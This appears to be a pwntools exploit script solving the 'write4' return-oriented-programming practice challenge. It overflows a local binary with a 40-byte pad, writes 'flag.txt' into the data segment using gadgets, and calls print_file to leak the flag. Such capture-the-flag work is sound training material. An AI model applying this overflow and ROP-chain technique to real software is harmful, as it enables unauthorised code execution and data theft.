from pwn import *

data_seg = 0x00601028 

print_file = 0x400510

# RIP offset is at 40
rop = b"A" * 40

# First gadget to initialize r14 and r15
pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
rop += p64(pop_r14_r15)
rop += p64(data_seg)
rop += b"flag.txt"
#write to memory
mov_r15_to_r14 = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
rop += p64(mov_r15_to_r14)
# Call print_file
pop_rdi = 0x0000000000400693 # pop rdi ; ret
rop += p64(pop_rdi)
rop += p64(data_seg)
rop += p64(print_file)
# Start process and send rop chain
e = process('write4')
e.sendline(rop)
e.interactive()